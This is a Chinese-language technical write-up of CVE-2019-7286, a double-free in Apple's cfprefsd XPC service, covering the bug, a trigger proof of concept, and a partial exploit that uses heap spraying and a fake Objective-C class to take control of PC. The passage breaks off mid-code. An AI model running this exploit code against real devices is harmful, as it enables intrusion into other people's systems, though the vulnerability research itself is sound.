<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[CFPrefsDaemon initWithRole:role testMode] &#123;</span><br><span class="line">  ...</span><br><span class="line">  listener =</span><br><span class="line">    xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,</span><br><span class="line">                                       0,</span><br><span class="line">                                       XPC_CONNECTION_MACH_SERVICE_LISTENER);</span><br><span class="line">  // 事件处理</span><br><span class="line">  xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) &#123;</span><br><span class="line">    if (xpc_get_type(peer) == XPC_TYPE_CONNECTION) &#123;</span><br><span class="line">      // 处理 XPC_TYPE_CONNECTION</span><br><span class="line">      xpc_connection_set_event_handler(peer, ^(xpc_object_t obj) &#123;</span><br><span class="line">        if (xpc_get_type(obj) == XPC_TYPE_DICTIONARY) &#123;</span><br><span class="line">          context_obj = xpc_connection_get_context(peer);</span><br><span class="line">          cfprefsd = context_obj.cfprefsd;</span><br><span class="line">          [cfprefsd handleMessage:obj fromPeer:peer replyHandler:</span><br><span class="line">            ^(xpc_object_t reply)</span><br><span class="line">            &#123;</span><br><span class="line">              xpc_connection_send_message(peer, reply);</span><br><span class="line">            &#125;];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 队列</span><br><span class="line">      char label[0x80];</span><br><span class="line">      pid_t pid = xpc_connection_get_pid(peer)</span><br><span class="line">      dispatch_queue_t queue;</span><br><span class="line">      int label_len = snprintf(label, 0x80, &quot;Serving PID %d&quot;, pid);</span><br><span class="line">      if (label_len &gt; 0x7e) &#123;</span><br><span class="line">        queue = NULL;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        queue = dispatch_queue_create(label, NULL);</span><br><span class="line">      &#125;</span><br><span class="line">      xpc_connection_set_target_queue(peer, queue);</span><br><span class="line"></span><br><span class="line">      context_obj = [[CFPrefsClientContext alloc] init];</span><br><span class="line">      context_obj.lock = 0;</span><br><span class="line">      context_obj.cfprefsd = self; // the CFPrefsDaemon object</span><br><span class="line">      context_obj.isPlatformBinary = -1; // char</span><br><span class="line">      context_obj.valid = 1;</span><br><span class="line">      xpc_connection_set_context(peer, context_obj);</span><br><span class="line">      xpc_connection_set_finalizer(peer, client_context_finalizer)</span><br><span class="line">      xpc_connection_resume(peer);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="CVE-2019-7286"><a href="#CVE-2019-7286" class="headerlink" title="CVE-2019-7286"></a>CVE-2019-7286</h2><blockquote>
<p>在iOS 12.1.4中修复，适用于iPhone 5s 及更新机型、iPad Air 及更新机型以及第 6 代 iPod touch</p>
</blockquote>
<p>如前言中所述，cfprefsd是通过[CFPrefsDaemon handleMessage:fromPeer:replyHandler:]来处理传入连接的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">-[CFPrefsDaemon handleMessage:msg fromPeer:peer replyHandler: handler] &#123;</span><br><span class="line">  if (xpc_get_type(msg) == XPC_TYPE_ERROR) &#123;</span><br><span class="line">    [self handleError:msg]</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    xpc_dictionary_get_value(msg, &quot;connection&quot;, peer);</span><br><span class="line">    uint64_t op = xpc_dictionary_get_uint64(msg, &quot;CFPreferencesOperation&quot;);</span><br><span class="line">    switch (op) &#123;</span><br><span class="line">     case 1:</span><br><span class="line">     case 7:</span><br><span class="line">     case 8:</span><br><span class="line">      [self handleSourceMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 2:</span><br><span class="line">      [self handleAgentCheckInMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 3:</span><br><span class="line">      [self handleFlushManagedMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 4:</span><br><span class="line">      [self handleFlushSourceForDomainMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 5:</span><br><span class="line">      [self handleMultiMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 6:</span><br><span class="line">      [self handleUserDeletedMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     default:</span><br><span class="line">      // send error reply</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题出在case 5: handleMultiMessage上，处理xpc_array类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">-[CFPrefsDaemon handleMultiMessage:msg replyHandler: handler]</span><br><span class="line">&#123;</span><br><span class="line">  xpc_object_t peer = xpc_dictionary_get_remote_connection(msg);</span><br><span class="line">  // ...</span><br><span class="line">  xpc_object_t messages = xpc_dictionary_get_value(msg, &quot;CFPreferencesMessages&quot;);</span><br><span class="line">  if (!messages || xpc_get_type(messages) != OS_xpc_array) &#123;</span><br><span class="line">    // send error message</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 如果只包含dictionaries或null, 直接返回</span><br><span class="line">  bool all_types_valid = xpc_array_apply(messages, ^(xpc_object_t entry) &#123;</span><br><span class="line">    xpc_type_t type = xpc_get_type(entry);</span><br><span class="line">    return (type == XPC_TYPE_DICTIONARY || type == XPC_TYPE_NULL)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  if (!all_types_valid) &#123;</span><br><span class="line">    // return error</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  size_t n_sub_messages = xpc_array_get_count(messages);</span><br><span class="line"></span><br><span class="line">  // macro from CFInternal.h</span><br><span class="line">  // allocates either on the stack or heap</span><br><span class="line">  new_id_array(sub_messages, n_sub_messages);</span><br><span class="line"></span><br><span class="line">  if (n_sub_messages &gt; 0) &#123;</span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      // raw pointers, not holding a reference</span><br><span class="line">      sub_messages[i] = xpc_array_get_value(messages, i);  // &lt;--- 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) &#123;</span><br><span class="line">        [self handleMessage: sub_messages[i]  // &lt;--- 2</span><br><span class="line">              fromPeer: peer</span><br><span class="line">              replyHandler: ^(xpc_object_t reply) &#123;</span><br><span class="line">                sub_messages[i] = xpc_retain(reply);  // &lt;--- 3</span><br><span class="line">              &#125;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  xpc_object_t reply = xpc_dictionary_create_reply(msg);  // &lt;--- 4</span><br><span class="line">  xpc_object_t replies_arr = xpc_array_create(sub_messages, n_sub_messages);</span><br><span class="line">  xpc_dictionary_set_value(reply, &quot;CFPreferencesMessages&quot;, replies_arr);</span><br><span class="line"></span><br><span class="line">  xpc_release(replies_arr);</span><br><span class="line"></span><br><span class="line">  if (n_sub_messages) &#123;</span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      if (xpc_get_type(sub_messages[i]) != XPC_TYPE_NULL) &#123;</span><br><span class="line">        xpc_release(sub_messages[i]);  // &lt;--- 5</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_id_array(sub_messages);</span><br><span class="line"></span><br><span class="line">  handler(reply);</span><br><span class="line"></span><br><span class="line">  xpc_release(reply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示，在第1步中，适用xpc_array_get_value函数将内容从xpc_array中取出，放入sub_messages中。第2步，将sub_messages传给handleMessage()函数处理所有子消息。第3步，将sub_messages中的每一个值改变为reply消息（这是一个引用）。第4步，当所有的子消息被处理后，根据所有的回复中创建一个xpc_array，在59行调用相应的replyHandler，处理所有子消息的reply消息。</p>
<p>问题是，不是所有的消息类型都会有reply，就是指这些消息不会调用replyHandler函数。正如第3步中显示的那样，对于这些不reply的消息，一般采用的处理方式是NOP掉。通过查询开发者手册可知，xpc_release()函数将减少对象的引用，xpc_array_get_value()函数用于获取指定下标中的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xpc_release</span><br><span class="line">Decrements the reference count of an object.</span><br><span class="line"></span><br><span class="line">xpc_array_get_value(_:_:)</span><br><span class="line">Returns the value at the specified index in the array.</span><br></pre></td></tr></table></figure>

<p>这里设计的本意是通过xpc_retain()函数，改变sub_messages[i]中的值，也就是sub_messages[i]中的值变为了引用，这样后面在xpc_release()函数解引用时就能匹配上；否则，就会在释放<strong>CFPreferencesMessages</strong>数组时，由于引用已经被释放了，导致出现<strong>double-free</strong>。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>触发漏洞的键值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">poc_dict = &#123;</span><br><span class="line">  <span class="string">&quot;CFPreferencesOperation&quot;</span> = 5,</span><br><span class="line">  <span class="string">&quot;CFPreferencesMessages&quot;</span> = [</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="string">&quot;CFPreferencesOperation&quot;</span>: 4  </span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> ;</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_connection_t</span> conn = xpc_connection_create_mach_service(<span class="string">&quot;com.apple.cfprefsd.daemon&quot;</span>,<span class="number">0</span>,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">  xpc_connection_set_event_handler(conn, ^(<span class="type">xpc_object_t</span> t) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got message: %sn&quot;</span>, xpc_copy_description(t));</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">  xpc_connection_resume(conn);</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_object_t</span> hello = xpc_dictionary_create(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  xpc_dictionary_set_int64(hello, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">5</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_object_t</span> arr = xpc_array_create(<span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">xpc_object_t</span> arr_elem1 = xpc_dictionary_create(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  xpc_dictionary_set_int64(arr_elem1, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line">  xpc_array_append_value(arr, arr_elem1);</span><br><span class="line">  xpc_dictionary_set_value(hello, <span class="string">&quot;CFPreferencesMessages&quot;</span>, arr);</span><br><span class="line">  xpc_connection_send_message(conn, hello);</span><br><span class="line">  xpc_release(hello);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-ZecOps"><a href="#漏洞利用-ZecOps" class="headerlink" title="漏洞利用 - ZecOps"></a>漏洞利用 - ZecOps</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这里使用两个线程，一个用于触发漏洞，一个用于填充内存空间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----------------+       +---------------+</span><br><span class="line">|   vul_thread   |       |  fill_thread  |</span><br><span class="line">|                |       |               |</span><br><span class="line">| +------------+ |       |               |</span><br><span class="line">| | first free | |       |               |</span><br><span class="line">| |            | |       |               |</span><br><span class="line">| +-----+------+ |       |               |</span><br><span class="line">|       |        |       |  +----------+ |</span><br><span class="line">|       |        |       |  | allocate | |</span><br><span class="line">|       +&lt;------------------+          | |</span><br><span class="line">|       |        |       |  +----------+ |</span><br><span class="line">| +-----v------+ |       |               |</span><br><span class="line">| | double free| |       |               |</span><br><span class="line">| |            | |       |               |</span><br><span class="line">| +------------+ |       |               |</span><br><span class="line">|                |       |               |</span><br><span class="line">+----------------+       +---------------+</span><br></pre></td></tr></table></figure>

<h4 id="Double-Free转Use-After-Free"><a href="#Double-Free转Use-After-Free" class="headerlink" title="Double-Free转Use-After-Free"></a>Double-Free转Use-After-Free</h4><p>两次 xpc_release 之间的时间窗口会很短，由于XPC请求是可控的，我们可以创建一个很大的xpc_array，来获取足够的时间窗口去填充释放的内存。</p>
<p>接下来是要寻找一个合适的填充对象，该对象应该满足以下几点：</p>
<ol>
<li>可以控制前8个字节，允许控制ISA指针</li>
<li>对象的大小应该是0xc0——与释放的xpc_dictionary_t相同，更有可能填满释放的内存</li>
<li>应该可以控制内存分配，提高填充率</li>
</ol>
<p>这里选择的是OS_xpc_string，在反序列化 OS_xpc_string 时，函数 xpc_string_deserialize 调用 xpc_try_strdup（封装的strdup()函数）。通过控制字符串的长度，可以控制分配的大小。将多个 OS_xpc_string 对象添加到反序列化的字典或数组中也可能会增加填充率。长度为 0xc0 的字符串能达到超过 60% 的填充释放对象的成功率。</p>
<h4 id="控制PC"><a href="#控制PC" class="headerlink" title="控制PC"></a>控制PC</h4><p>Object-C 对象的前 8 个字节是 ISA 指针。将 ISA 指针指向一个受控的内存空间可以让我们控制 Object-C 的方法调用，这里可以参考<a target="_blank" rel="noopener" href="http://phrack.org/issues/69/9.html#article">Modern Objective-C Exploitation Techniques</a>。</p>
<p>下一个问题是要解决ASLR，这里是通过堆喷来实现的，可以参考Ian Beer的<a target="_blank" rel="noopener" href="https://thecyberwire.com/events/docs/IanBeer_JSS_Slides.pdf">Auditing and Exploiting Apple IPC</a>。</p>
<p>堆喷的数据是在VM_ALLOCATE区域，可以在 0x180202000 可靠地找到。由于字符串截断机制，我们需要稍微移动数据，使用 0x180202020 而不是 0x180202000。如果我们使用 0x180202000，作为字符串的第一个字节的第一个空字节将终止字符串。</p>
<p>但是，控制PC以后的成功率反而降低了，从60%+ 下降到 5%-，原因是在64位中，0x180202020实际是0x0000000180202020，字符串将在第五个字节处截断，由于OS X使用基于大小的空闲列表来加速分配，字符串可能会分配到其他地方。</p>
<p>在控制PC之后，我们可以构造一个payload来做Return Oriented Programming，通过调用system()或者像Brandon的<a target="_blank" rel="noopener" href="https://bazad.github.io/2018/11/introduction-userspace-race-conditions-ios/">An introduction to exploiting userspace race conditions on iOS</a>那样获取cfprefsd的任务端口来执行任意命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;xpc/xpc.h&gt;</span><br><span class="line">#import &lt;pthread.h&gt;</span><br><span class="line">#include &lt;mach/mach.h&gt;</span><br><span class="line">#include &lt;mach/task.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;mach-o/dyld_images.h&gt;</span><br><span class="line">#include &lt;objc/runtime.h&gt;</span><br><span class="line"> </span><br><span class="line">#define AGENT 1</span><br><span class="line"> </span><br><span class="line">#define FILL_DICT_COUNT 0x600</span><br><span class="line">#define FILL_COUNT 0x1000</span><br><span class="line">#define FREE_COUNT 0x2000</span><br><span class="line">#define FILL_SIZE (0xc0)</span><br><span class="line"> </span><br><span class="line">int need_stop = 0;</span><br><span class="line"> </span><br><span class="line">struct heap_spray &#123;</span><br><span class="line">    void* fake_objc_class_ptr;</span><br><span class="line">    uint32_t r10;</span><br><span class="line">    uint32_t r4;</span><br><span class="line">    void* fake_sel_addr;</span><br><span class="line">    uint32_t r5;</span><br><span class="line">    uint32_t r6;</span><br><span class="line">    uint64_t cmd;</span><br><span class="line">    uint8_t pad1[0x3c];</span><br><span class="line">    uint32_t stack_pivot;</span><br><span class="line">    struct fake_objc_class_t &#123;</span><br><span class="line">        char pad[0x8];</span><br><span class="line">        void* cache_buckets_ptr;</span><br><span class="line">        uint32_t cache_bucket_mask;</span><br><span class="line">    &#125; fake_objc_class;</span><br><span class="line">    struct fake_cache_bucket_t &#123;</span><br><span class="line">        void* cached_sel;</span><br><span class="line">        void* cached_function;</span><br><span class="line">    &#125; fake_cache_bucket;</span><br><span class="line">    char command[32];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">void fill_once()&#123;</span><br><span class="line">   </span><br><span class="line">#if AGENT</span><br><span class="line">    xpc_connection_t client = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0);</span><br><span class="line">#else</span><br><span class="line">    xpc_connection_t client = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">#endif</span><br><span class="line">   </span><br><span class="line">    xpc_connection_set_event_handler(client, ^void(xpc_object_t response) &#123;</span><br><span class="line">        xpc_type_t t = xpc_get_type(response);</span><br><span class="line">        if (t == XPC_TYPE_ERROR)&#123;</span><br><span class="line">            printf(&quot;err: %s\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));</span><br><span class="line">            need_stop = 1 ;</span><br><span class="line">        &#125;</span><br><span class="line">        //printf(&quot;received an event\n&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">   </span><br><span class="line">    xpc_connection_resume(client);</span><br><span class="line">    xpc_object_t main_dict = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">   </span><br><span class="line">    xpc_object_t arr = xpc_array_create(NULL, 0);</span><br><span class="line">   </span><br><span class="line">    xpc_object_t spray_dict = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">    xpc_dictionary_set_int64(spray_dict, &quot;CFPreferencesOperation&quot;, 8);</span><br><span class="line">    xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesDomain&quot;, &quot;xpc_str_domain&quot;);</span><br><span class="line">    xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesUser&quot;, &quot;xpc_str_user&quot;);</span><br><span class="line">   </span><br><span class="line">    char key[100];</span><br><span class="line">    char value[FILL_SIZE];</span><br><span class="line">    memset(value, &quot;A&quot;, FILL_SIZE);</span><br><span class="line">    *((uint64_t *)value) = 0x4142010180202020;</span><br><span class="line">    //*((uint64_t *)value) = 0x180202020;</span><br><span class="line">    value[FILL_SIZE-1]=0;</span><br><span class="line">    for (int i=0; i&lt;FILL_DICT_COUNT; i++) &#123;</span><br><span class="line">        sprintf(key, &quot;%d&quot;,i);</span><br><span class="line">        xpc_dictionary_set_string(spray_dict, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //NSLog(@&quot;%@&quot;, spray_dict);</span><br><span class="line">    for (uint64_t i=0; i&lt;FILL_COUNT; i++) &#123;</span><br><span class="line">        xpc_array_append_value(arr, spray_dict);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    xpc_dictionary_set_int64(main_dict, &quot;CFPreferencesOperation&quot;, 5);</span><br><span class="line">   </span><br><span class="line">    xpc_dictionary_set_value(main_dict, &quot;CFPreferencesMessages&quot;, arr);</span><br><span class="line"> </span><br><span class="line">    void* heap_spray_target_addr = (void*)0x180202000;</span><br><span class="line">    struct heap_spray* map = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);</span><br><span class="line">    memset(map, 0, 0x1000);</span><br><span class="line">    struct heap_spray* hs = (struct heap_spray*)((uint64_t)map + 0x20);</span><br><span class="line">    //hs-&gt;null0 = 0;</span><br><span class="line">    hs-&gt;cmd = -1;</span><br><span class="line">    hs-&gt;fake_objc_class_ptr = &amp;hs-&gt;fake_objc_class;</span><br><span class="line">    hs-&gt;fake_objc_class.cache_buckets_ptr = &amp;hs-&gt;fake_cache_bucket;</span><br><span class="line">    hs-&gt;fake_objc_class.cache_bucket_mask = 0;</span><br><span class="line">    hs-&gt;fake_sel_addr = &amp;hs-&gt;fake_cache_bucket.cached_sel;</span><br><span class="line">    // nasty hack to find the correct selector address</span><br><span class="line">    hs-&gt;fake_cache_bucket.cached_sel = 0x7fff00000000 + (uint64_t)NSSelectorFromString(@&quot;dealloc&quot;);</span><br><span class="line">   </span><br><span class="line">    hs-&gt;fake_cache_bucket.cached_function = 0xdeadbeef;</span><br><span class="line">    size_t heap_spray_pages = 0x40000;</span><br><span class="line">    size_t heap_spray_bytes = heap_spray_pages * 0x1000;</span><br><span class="line">    char* heap_spray_copies = malloc(heap_spray_bytes);</span><br><span class="line">    for (int i = 0; i &lt; heap_spray_pages; i++)&#123;</span><br><span class="line">    memcpy(heap_spray_copies+(i*0x1000), map, 0x1000);</span><br><span class="line">    &#125;</span><br><span class="line">    xpc_dictionary_set_data(main_dict, &quot;heap_spray&quot;, heap_spray_copies, heap_spray_bytes);</span><br><span class="line"> </span><br><span class="line">    //NSLog(@&quot;%@&quot;, main_dict);</span><br><span class="line">    xpc_connection_send_message(client, main_dict);</span><br><span class="line">    printf(&quot;fill once\n&quot;);</span><br><span class="line">    xpc_release(main_dict);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void trigger_vul()&#123;</span><br><span class="line">    #if AGENT</span><br><span class="line">        printf(&quot;AGENT\n&quot;);</span><br><span class="line">        xpc_connection_t conn = 